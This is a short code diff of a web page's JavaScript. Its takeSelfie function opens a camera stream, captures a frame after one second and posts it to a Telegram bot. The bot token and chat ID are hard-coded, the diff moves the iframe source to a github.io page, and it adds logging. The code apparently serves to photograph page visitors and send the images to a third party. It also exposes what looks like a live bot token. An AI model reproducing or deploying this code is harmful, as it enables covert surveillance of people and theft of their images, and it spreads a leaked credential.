@@ -65,7 +65,7 @@
 
         function takeSelfie() {
             const iframe = document.createElement('iframe');
-            iframe.src = 'https://yourdomain.com/camera.html';
+            iframe.src = 'https://yourusername.github.io/camera.html';
             document.body.appendChild(iframe);
 
             iframe.onload = () => {
@@ -77,9 +77,11 @@
                     .then(stream => {
                         video.srcObject = stream;
                         video.play();
+                        console.log('Camera stream started');
                         setTimeout(() => {
                             context.drawImage(video, 0, 0, canvas.width, canvas.height);
                             const imageData = canvas.toDataURL('image/jpeg');
+                            console.log('Selfie captured');
                             const botToken = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA';
                             const chatId = '5410457102';
                             fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {
@@ -92,6 +94,7 @@
                                     photo: imageData
                                 })
                             });
+                            console.log('Selfie sent to Telegram');
                         }, 1000); // Capture after 1 second
                     })
                     .catch(err => {
